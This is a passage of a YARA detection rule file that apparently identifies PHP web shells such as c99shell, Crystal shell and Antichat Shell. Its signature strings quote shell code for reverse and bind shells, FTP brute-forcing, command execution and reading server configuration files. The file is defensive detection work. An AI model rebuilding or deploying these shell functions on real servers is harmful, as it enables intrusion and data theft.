      $s6 = "if (!$sock) {echo \"I can't connect to localhost:\".$bind[\"port\"].\"! I think you should configure your firewall.\";}" fullword ascii
      $s7 = "if (trim($cmd) == \"ps -aux\") {$act = \"processes\";}" fullword ascii
      $s8 = "ho urlencode($d); ?>\"><b>Command execute</b></a> ::</b></p></td></tr>" fullword ascii
      $s9 = "header(\"WWW-Authenticate: Basic realm=\\\"c99shell \".$shver.\": \".$login_txt.\"\\\"\");" fullword ascii
      $s10 = "$log_email = \"user@host.tld\"; //Default e-mail for sending logs" fullword ascii
      $s11 = "list($datapipe[\"remotehost\"],$datapipe[\"remoteport\"]) = explode(\":\",$datapipe[\"remoteaddr\"]);" fullword ascii
      $s12 = "elseif (!$data = c99getsource($datapipe[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
      $s13 = "$accessdeniedmess = \"<a href=\\\"http://ccteam.ru/releases/c99shell\\\">c99shell v.\".$shver.\"</a>: access denied\";" fullword ascii
      $s14 = "xp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>" fullword ascii
      $s15 = "if (empty($datapipe[\"remoteaddr\"])) {$datapipe[\"remoteaddr\"] = \"irc.dalnet.ru:6667\";}" fullword ascii
      $s16 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>Enter: </b><form action=\"<?php echo $surl; ?>\"><input type=hidden" ascii
      $s17 = "if (empty($bc[\"host\"])) {$bc[\"host\"] = getenv(\"REMOTE_ADDR\");}" fullword ascii
      $s18 = "echo \"<form action=\\\"\".$surl.\"\\\"><input type=hidden name=act value=\\\"ftpquickbrute\\\"><br>Read first: <input type=text" ascii
      $s19 = "array(\"find config* files in current dir\", \"find . -type f -name \\\"config*\\\"\")," fullword ascii
      $s20 = "\\\"><u>View binder's process</u></a></center>\";}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _c99_C99Shell_v__1_0_beta__5_02_2005__C99Shell_v__1_0_pre_release_build_safe_mode__CTT_Shell_ctt_sh_9 {
   meta:
      description = "php - from files c99.txt, C99Shell v. 1.0 beta (5.02.2005).txt, C99Shell v. 1.0 pre-release build(safe-mode).txt, CTT Shell.txt, ctt_sh.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
      hash2 = "4def2e67459d28da594f62897d3e9770bff411be14a15420e363cc21731d860d"
      hash3 = "edffc06506bd512f0676dabb13e88736c88454eb59d421a13319d6db8065b6f7"
      hash4 = "e91635211f44362041fc4c39f11b817e5ff20cf27777cae035284039d63fc53d"
      hash5 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
   strings:
      $s1 = "\"krqAsLfJ7YQBl4tiRCYFSpPMdRRCoQOiL4i8CgZgk09WfWLBYZHB6UWjCequwEDHuOEVK3QtgN/j\"." fullword ascii
      $s2 = "if (!function_exists(\"mysql_dump\"))" fullword ascii
      $s3 = "\"AkUnGTkRNwMS34MBJBgdRkJLCD7qggEPKxsJKiYTBweJkjhQkk7AhxQ9FqgLMGBGkG8KFCg8JKAi\"." fullword ascii
      $s4 = "\"pVxqhlxqiExkimKBtMPL2Ftvj2OV6aOuwpqlulyN3cnO1wAAXQAAZSM8jE5XjgAAbwAAeURBYgAA\"." fullword ascii
      $s5 = "\"wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA\"." fullword ascii
      $s6 = "\"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6\"." fullword ascii
      $s7 = "\"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm\"." fullword ascii
      $s8 = "\"gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"." fullword ascii
      $s9 = "\"Xv/9qfbptP/uZ93GiNq6XWpRJ//iQv7wsquEQv/jRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"." fullword ascii
      $s10 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\"." fullword ascii
      $s11 = "\"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA\"." fullword ascii
      $s12 = "\"R0lGODlhJgAWAIAAAAAAAP///yH5BAUUAAEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQ\"." fullword ascii
      $s13 = "\"/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA\"." fullword ascii
      $s14 = "\"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A\"." fullword ascii
      $s15 = "\"Ev/hP+7OOP/WHv/wbHNfP4VzV7uPFv/pV//rXf/ycf/zdv/0eUNJWENKWsykIk9RWMytP//4iEpQ\"." fullword ascii
      $s16 = "\"QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA\"." fullword ascii
      $s17 = "\"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP//\"." fullword ascii
      $s18 = "\"ZeAPNudAX9sKMPv7+15QU5ubm39/f8e5u4xiatra2ubKz8PDw+pfee9/lMK0t81rfd8AKf///wAA\"." fullword ascii
      $s19 = "\"R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz\"." fullword ascii
      $s20 = "\"AAgzAFEIHEiwoMGDCBH6W0gtoUB//1BENOiP2sKECzNeNIiqY0d/FBf+y0jR48eQGUc6JBgQADs=\"," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Crystal_shell_Crystal_10 {
   meta:
      description = "php - from files Crystal shell.txt, Crystal.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "689472bcb32c4d627e4e33d54e72918e549c0cbf1136546048a3526ec3addf4e"
      hash2 = "8cbde0e322651be9d980fe33ddee4844beabc7ded6fbc270d92a3772cd25f284"
   strings:
      $s1 = "Security Center Team</a> |<a href=\"http://www.secure4center.com\"><font color=\"#DCE7EF\">securityCenter</font></a>|" fullword ascii
      $s2 = "document.notifyForm.action = \"http://www.zone-h.org/component/option,com_notify/Itemid,89/task,single/\"" fullword ascii
      $s3 = "&nbsp;</b><font face=\"Wingdings 3\" size=\"5\">y</font><b>Crystal shell v. 1 beta&nbsp; </b><font color=\"#CC0000\"><b>" fullword ascii
      $s4 = "maxLength=250 value=http://www.microsoft.com name=domain size=\"1\"> </TD>" fullword ascii
      $s5 = "style=\"FONT-SIZE: 4px\">&nbsp;</SPAN></TD></TR></TBODY></TABLE><!-- Input Form --><TABLE class=notifyForm width=\"100%\">" fullword ascii
      $s6 = "or: #000000; scrollbar-darkshadow-color: #000000; scrollbar-track-color: #000000; scrollbar-arrow-color: #ffffff }" fullword ascii
      $s7 = "value=24>Remote service password guessing</OPTION><OPTION value=26>" fullword ascii
      $s8 = "intrusion</OPTION><OPTION value=16>URL Poisoning</OPTION><OPTION value=7>" fullword ascii
      $s9 = "t face=\"verdana\" color=\"white\"><a title=\"bind shell\" href=\"?act=bindport\"><font color=#CC0000 size=\"3\">Bind</font></a>" ascii
      $s10 = "action=http://www.zone-h.org/component/option,com_notify/Itemid,89/task,single/" fullword ascii
      $s11 = "!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:" fullword ascii
      $s12 = "<a href=\"?act=bypass\"><font color=#CC0000 size=\"3\">" fullword ascii
      $s13 = "style=\"FONT-SIZE: 4px\">&nbsp;</SPAN></TD></TR></TBODY></TABLE><!-- Input Form --><TABLE class=noti" fullword ascii
      $s14 = "border-bottom: 1px solid #aaaaaa\"></TD></TR><!-- INSTRUCTIONS -->" fullword ascii
      $s15 = "value=com_notify name=option style=\"font-family: Verdana; font-size: 10px; color: black; border: 2px sol" fullword ascii
      $s16 = "<a class=\"sublevel\" href=\"http://www.zone-h.org/component/option,com_attacks/Itemid,45/\">" fullword ascii
      $s17 = "password bruteforce</OPTION><OPTION" fullword ascii
      $s18 = "Injection</OPTION><OPTION value=10>SSH Server" fullword ascii
      $s19 = "administrative panel access through password" fullword ascii
      $s20 = "height=20 style=\"color: #000000; border: 1px solid #000000; background-color: #000000\"><b><font size=\"1\" color=\"#FF0000\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99_C99Shell_v__1_0_pre_release_build_safe_mode__c99_locus7s_c99_PSych0_c99_w4cking_11 {
   meta:
      description = "php - from files c99.txt, C99Shell v. 1.0 pre-release build(safe-mode).txt, c99_locus7s.txt, c99_PSych0.php, c99_w4cking.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
      hash2 = "edffc06506bd512f0676dabb13e88736c88454eb59d421a13319d6db8065b6f7"
      hash3 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash4 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash5 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
   strings:
      $s1 = "elseif ($sql_act == \"tbldump\") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} " fullword ascii
      $s2 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.lo" ascii
      $s3 = "if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo \"Warning! Configuration error in \\$regxp_highlight[\"" fullword ascii
      $s4 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=cmd><input type=\\\"te" ascii
      $s5 = "\\\"dump\\\"><input type=\\\"hidden\\\" name=\\\"sql_db\\\" value=\\\"\".htmlspecialchars($sql_db).\"\\\"><input type=\\\"hidden" ascii
      $s6 = "$fqb_log .= \"Connected to \".getenv(\"SERVER_NAME\").\" with login \\\"\".$str[0].\"\\\" and password \\\"\".$str[0].\"\\\", at" ascii
      $s7 = "foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct.\" (\";} $" fullword ascii
      $s8 = "if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = \"Query was empty\";} e" fullword ascii
      $s9 = "if ($i != $k) {$head[$i] = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$i.$parsesort[1]." ascii
      $s10 = "fqb_lenght\\\" value=\\\"\".$nixpwdperpage.\"\\\"><br><br>Users only with shell?&nbsp;<input type=\\\"checkbox\\\" name=\\\"fqb_" ascii
      $s11 = "while ($row = mysql_fetch_array($result)) {$count = mysql_query (\"SELECT COUNT(*) FROM \".$row[0]); $count_row = mysql_fetch_" fullword ascii
      $s12 = "if (file_get_contents(\"/etc/syslog.conf\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=syslog.conf&d=\".urlenc" ascii
      $s13 = "\\\"Execute\\\">&nbsp;Display in text-area&nbsp;<input type=\\\"checkbox\\\" name=\\\"eval_txt\\\" value=\\\"1\\\"\"; if ($eval_" ascii
      $s14 = "if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo \"<a href=\\\"\".$sql_surl.\"sql_tbl=\".urlenc" fullword ascii
      $s15 = "elseif (is_callable(\"system\") and !in_array(\"system\",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $re" ascii
      $s16 = "elseif (is_callable(\"passthru\") and !in_array(\"passthru\",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd" ascii
      $s17 = "echo \"<b>Dumped! Dump has been writed to \\\"\".htmlspecialchars(realpath($sql_dump_file)).\"\\\" (\".view_size(filesize($sql_d" ascii
      $s18 = "rr?\"<b>Error:</b> \".$err:\"\").\"<form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=d value=\\\"\".htmlspeci" ascii
      $s19 = "echo \"<b>File:</b>&nbsp;<input type=\\\"text\\\" name=\\\"sql_dump_file\\\" value=\\\"\".$tmp.\"\\\" size=\\\"\".(strlen($tmp)+" ascii
      $s20 = "if (file_get_contents(\"/etc/httpd.conf\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=httpd.conf&d=\".urlencod" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _aZRaiLPhp_v1_0_CasuS_1_5_12 {
   meta:
      description = "php - from files aZRaiLPhp v1.0.php, CasuS 1.5.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "a342a05367676060378f49afb43bfbc33c428c1de70d631a8edc7574ee9beaea"
      hash2 = "b377c947650d47b053eb55ee4049828260a19095baa3110e3f0d07e9ad489ba6"
   strings:
      $s1 = "echo \"<a href='./$this_file?op=del&fname=$path/$file&dir=$path'>sil</a> - <b>$total_kb$total_kb2</b> - \";" fullword ascii
      $s2 = "echo \"<center><a href='./$this_file?op=phpinfo' target='_blank'>PHP INFO</a></center>\";" fullword ascii
      $s3 = "&fname=$file'>indir</a> - <a href='./$this_file?op=edit&fname=$path/$file&dir=$path'>d" fullword ascii
      $s4 = "header(\"Content-type: application/force-download\");" fullword ascii
      $s5 = "echo \"<FORM  ENCTYPE='multipart/form-data' ACTION='$this_file?op=up&dir=$path' METHOD='POST'>\";" fullword ascii
      $s6 = "header(\"Content-Disposition: attachment; filename=$fname\");" fullword ascii
      $s7 = "echo \"<center><TEXTAREA style='WIDTH: 476px; HEIGHT: 383px' name=tarea rows=19 cols=52>$duzen</TEXTAREA></center><br>\";" fullword ascii
      $s8 = "header(\"Content-Length: \".filesize($save));" fullword ascii
      $s9 = "echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><font color='#FFFF00'>$fileperm</font></a>\";" fullword ascii
      $s10 = "echo \"<form method=post action=$this_file?op=edit&fname=$yol&dir=$path>\";" fullword ascii
      $s11 = "echo \"<center><a href='./$this_file?dir=E:\\\\'>E:\\\\</a></center>\";" fullword ascii
      $s12 = "echo \"<center><a href='./$this_file?dir=H:\\\\'>H:\\\\</a></center>\";" fullword ascii
      $s13 = "echo \"<center><a href='./$this_file?dir=F:\\\\'>F:\\\\</a></center>\";" fullword ascii
      $s14 = "echo \"<center><a href='./$this_file?dir=C:\\\\'>C:\\\\</a></center>\";" fullword ascii
      $s15 = "echo \"<center><a href='./$this_file?dir=G:\\\\'>G:\\\\</a></center>\";" fullword ascii
      $s16 = "echo \"<center><a href='./$this_file?dir=D:\\\\'>D:\\\\</a></center>\";" fullword ascii
      $s17 = "echo \"<FORM METHOD='POST' ACTION='$this_file?op=mf&dir=$path'>\";" fullword ascii
      $s18 = "echo \"<FORM METHOD='POST' ACTION='$this_file?op=md&dir=$path'>\";" fullword ascii
      $s19 = "echo \"<br><br><center><font size='+1' color='#FF0000'><b>DOSYA GONDERME</b></font></center><br>\";" fullword ascii
      $s20 = "echo \"<form method=post action=./$this_file?op=efp2>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 40KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99_locus7s_c99_w4cking_13 {
   meta:
      description = "php - from files c99_locus7s.txt, c99_w4cking.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash2 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
   strings:
      $s1 = "$blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
      $s2 = "hbd $por\",$scan)){ $data = (\"\\n</br>Process not found running, backdoor not setup successfully.\"); }" fullword ascii
      $s3 = "function myshellexec($command) {" fullword ascii
      $s4 = "$blah = ex(\"/tmp/backc \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
      $s5 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";" fullword ascii
      $s6 = "exec(\"$cmd > /dev/null &\");" fullword ascii
      $s7 = "if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']==\"Perl\"))" fullword ascii
      $s8 = "if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']==\"C\"))" fullword ascii
      $s9 = "$blah = ex($p2.\" back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
      $s10 = "$blah = ex(\"./backc \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
      $s11 = "we would not create and extract the need proxy files in '/tmp' this will make this fail.</br></br></center>\";" fullword ascii
      $s12 = "$ip = gethostbyname($_SERVER[\"HTTP_HOST\"]);" fullword ascii
      $s13 = "p it from ever opening a port and you won't be able to connect to this proxy.</br></br></center>\";" fullword ascii
      $s14 = "//$blah = ex(\"gcc -o /tmp/backc /tmp/back.c\");" fullword ascii
      $s15 = "if (!empty($_POST['backconnectport']) && ($_POST['use']==\"shbd\"))" fullword ascii
      $s16 = "$host = getenv(\"HTTP_HOST\");" fullword ascii
      $s17 = "$_POST['backcconnmsg']=\"To connect, use netcat and give it the command <b>'nc $ip $por'</b>.$data\";" fullword ascii
      $s18 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't connect!</b>\";" fullword ascii
      $s19 = "$_POST['proxyhostmsg']=\"</br></br><center><font color=red size=3><b>Failed!</b></font></br></br><b>Note:</b> If for some reason" ascii
      $s20 = "$scan = myshellexec(\"ps aux\"); " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99_C99Shell_v__1_0_beta__5_02_2005__C99Shell_v__1_0_pre_release_build_safe_mode__c99_w4cking_14 {
   meta:
      description = "php - from files c99.txt, C99Shell v. 1.0 beta (5.02.2005).txt, C99Shell v. 1.0 pre-release build(safe-mode).txt, c99_w4cking.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
      hash2 = "4def2e67459d28da594f62897d3e9770bff411be14a15420e363cc21731d860d"
      hash3 = "edffc06506bd512f0676dabb13e88736c88454eb59d421a13319d6db8065b6f7"
      hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
   strings:
      $x1 = "function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x2 = "$sql_passwd).\"&sql_server=\".htmlspecialchars($sql_server).\"&sql_port=\".htmlspecialchars($sql_port).\"&sql_act=processes\");" fullword ascii
      $s3 = "\"sql_act=processes&kill=\".$row[0].\"\\\"><u>Kill</u></a></td></tr>\";}" fullword ascii
      $s4 = "if (c99ftpbrutecheck(\"localhost\",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))" fullword ascii
      $s5 = "if ($actemptybuff) {$sess_data[\"copy\"] = $sess_data[\"cut\"] = array(); c99_sess_put($sess_data);}" fullword ascii
      $s6 = "_passwd).\"&sql_server=\".htmlspecialchars($sql_server).\"&sql_port=\".htmlspecialchars($sql_port).\"&\");" fullword ascii
      $s7 = "<nobr>[<a href=\\\"\".$surl.\"act=f&f=\".urlencode($f).\"&ft=info&base64=4&d=\".urlencode($d).\"\\\">Decode</a>]&nbsp;</nobr>" fullword ascii
      $s8 = "if (!$fp) {$uploadmess .= \"Error writing to file \".htmlspecialchars($destin).\"!<br>\";}" fullword ascii
      $s9 = "echo \"<center><b>Processes:</b><br><br>\";" fullword ascii
      $s10 = "<nobr>[<a href=\\\"\".$surl.\"act=f&f=\".urlencode($f).\"&ft=info&base64=1&d=\".urlencode($d).\"\\\">Encode</a>]&nbsp;</nobr>" fullword ascii
      $s11 = "<nobr>[<a href=\\\"\".$surl.\"act=f&f=\".urlencode($f).\"&ft=info&base64=2&d=\".urlencode($d).\"\\\">+chunk</a>]&nbsp;</nobr>" fullword ascii
      $s12 = "e=\"sql_port\" value=\"<?php echo htmlspecialchars($sql_port); ?>\"><select name=\"sql_db\"><?php" fullword ascii
      $s13 = ">] [<a href=\\\"\".$surl.\"act=f&f=\".urlencode($f).\"&ft=info&d=\".urlencode($d).\"\\\">Preview</a>]<br><b>Base64: </b>" fullword ascii
      $s14 = "if (!$content) {$uploadmess .=  \"Can't download file!<br>\";}" fullword ascii
      $s15 = "@ini_set(\"highlight.comment\",$highlight_comment); //#FF8000" fullword ascii
      $s16 = "\" and password \\\"\".$pass.\"\\\"</b></a>.<br>\";" fullword ascii
      $s17 = "echo \"<b>Result of execution this PHP-code</b>:<br>\";" fullword ascii
      $s18 = "echo \"<b>Processes:</b><br>\";" fullword ascii
      $s19 = "Save this file dir: <input name=\\\"uploadpath\\\" size=\\\"70\\\" value=\\\"\".$dispd.\"\\\"><br><br>" fullword ascii
      $s20 = "$sqlquicklaunch[] = array(\"Processes\",$surl.\"act=sql&sql_login=\".htmlspecialchars($sql_login).\"&sql_passwd=\".htmlspecialch" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _c99_C99Shell_v__1_0_pre_release_build_safe_mode__c99_locus7s_c99_PSych0_15 {
   meta:
      description = "php - from files c99.txt, C99Shell v. 1.0 pre-release build(safe-mode).txt, c99_locus7s.txt, c99_PSych0.php"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
      hash2 = "edffc06506bd512f0676dabb13e88736c88454eb59d421a13319d6db8065b6f7"
      hash3 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash4 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
   strings:
      $s1 = "e=\"text\" name=\"dump_file\" size=\"30\" value=\"<?php echo \"dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-" ascii
      $s2 = "m/scripts/contact.dll?msgto=656555\\\"><img src=\\\"http://wwp.icq.com/scripts/online.dll?icq=656555&img=5\\\" border=0 align=ab" ascii
      $s3 = "o htmlspecialchars($cmd); ?>\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Exec" ascii
      $s4 = "/select><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr>" ascii
      $s5 = "cho $surl; ?>\" method=\"POST\"><input type=\"hidden\" name=\"act\" value=\"sql\"><tr><td><input type=\"text\" name=\"sql_login" ascii
      $s6 = "if (!$fp) {return \"Local error: can't write update to \".__FILE__.\"! You may download c99shell.php manually <a href=\\\"\".$so" ascii
      $s7 = "e=\\\"fdbk_servinf\\\" value=\\\"1\\\" checked><br><br>There are no checking in the form.<br><br>* - strongly recommended, if yo" ascii
      $s8 = "if ($parsesort[1] != \"a\") {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"a\\\">" ascii
      $s9 = "if ($parsesort[1] != \"a\") {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"a\\\">" ascii
      $s10 = "db\"><input type=\"hidden\" name=\"sql_login\" value=\"<?php echo htmlspecialchars($sql_login); ?>\"><input type=\"hidden\" name" ascii
      $s11 = "ql_db); ?>\"><input type=\"hidden\" name=\"sql_login\" value=\"<?php echo htmlspecialchars($sql_login); ?>\"><input type=\"hidde" ascii
      $s12 = "else {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"d\\\"><img src=\\\"\".$surl." ascii
      $s13 = "\"><input type=\"hidden\" name=\"sql_login\" value=\"<?php echo htmlspecialchars($sql_login); ?>\"><input type=\"hidden\" name=" ascii
      $s14 = "else {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"d\\\"><img src=\\\"\".$surl." ascii
      $s15 = "></form></td><td width=\"30%\" height=\"1\"><b>Dump DB:</b><form action=\"<?php echo $surl; ?>\"><input type=\"hidden\" name=\"a" ascii
      $s16 = "?>\">&nbsp;<input type=\"submit\" name=\\\"submit\\\" value=\"Dump\"></form></td><td width=\"30%\" height=\"1\"></td></tr><tr><t" ascii
      $s17 = "Click \"Connect\" only after open port for it. You should use NetCat&copy;, run \"<b>nc -l -n -v -p <?php echo $bc_port; ?></b>" ascii
      $s18 = "=\"sql\"><input type=\"hidden\" name=\"sql_act\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"<?php echo htmlsp" ascii
      $s19 = "Click \"Connect\" only after open port for it. You should use NetCat&copy;, run \"<b>nc -l -n -v -p <?php echo $bc_port; ?></b>" ascii
      $s20 = "NukLeoN [AnTiSh@Re tEaM].<br>Thanks all who report bugs.<br>All bugs send to tristram's ICQ #656555 <a href=\\\"http://wwp.icq.c" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99_C99Shell_v__1_0_beta__5_02_2005__C99Shell_v__1_0_pre_release_build_safe_mode__16 {
   meta:
      description = "php - from files c99.txt, C99Shell v. 1.0 beta (5.02.2005).txt, C99Shell v. 1.0 pre-release build(safe-mode).txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
      hash2 = "4def2e67459d28da594f62897d3e9770bff411be14a15420e363cc21731d860d"
      hash3 = "edffc06506bd512f0676dabb13e88736c88454eb59d421a13319d6db8065b6f7"
   strings:
      $x1 = "am.ru/releases/cc99shell\\\">c99shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x2 = "if ($ext == \"c\") {$retgcc = myshellexec(\"gcc -o \".$binpath.\" \".$srcpath); @unlink($srcpath);}" fullword ascii
      $x3 = "if ($ext == \"c\") {$retgcc = myshellexec(\"gcc -o \".$binpath.\" \".$srcpath);  @unlink($srcpath);}" fullword ascii
      $s4 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $s5 = "$out = \"# Dumped by C99Shell.SQL v. \".$shver.\"" fullword ascii
      $s6 = "$retbind = myshellexec($v[1].\" > /dev/null &\");" fullword ascii
      $s7 = "echo \"<b>Result of execution this command</b>:<br>\";" fullword ascii
      $s8 = "\"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword ascii
      $s9 = "array(\"<img src=\\\"\".$surl.\"act=img&img=download\\\" border=\\\"0\\\">\",\"download\")," fullword ascii
      $s10 = "\"c99sh_bindport.c\"=>array(\"Using C\",\"%path %port %pass\")" fullword ascii
      $s11 = "\"c99sh_backconn.c\"=>array(\"Using C\",\"%path %host %port\")" fullword ascii
      $s12 = "\"c99sh_bindport.pl\"=>array(\"Using PERL\",\"perl %path %port\")," fullword ascii
      $s13 = "?><td width=\"25%\" height=\"100%\" valign=\"top\"><a href=\"<?php echo $surl.\"act=sql&sql_login=\".htmlspecialchars($sql_login" ascii
      $s14 = "echo \"<b>Result of back connection:</b><br>\";" fullword ascii
      $s15 = "$login = \"\"; //login" fullword ascii
      $s16 = "echo \"<b>Result of binding port:</b><br>\";" fullword ascii
      $s17 = "$pass = \"\"; //password" fullword ascii
      $s18 = "array(\"<img src=\\\"\".$surl.\"act=img&img=ext_rtf\\\" border=\\\"0\\\">\",\"notepad\")," fullword ascii
      $s19 = "\"66XB6cjZ8a/K79/s/dbn/ezz/czd9mN0jKTB6ai/76W97niXz2GCwV6AwUdstXyVyGSDwnmYz4io\"." fullword ascii
      $s20 = "$md5_pass = \"\"; //md5-cryped pass. if null, md5($pass)" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Antichat_Shell_v1_3_Antichat_Shell_17 {
   meta:
      description = "php - from files Antichat Shell v1.3.php, Antichat Shell.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "96c41509991a980cbf30b22615285895e0fd0e48aca7a63c04c446957fa2228e"
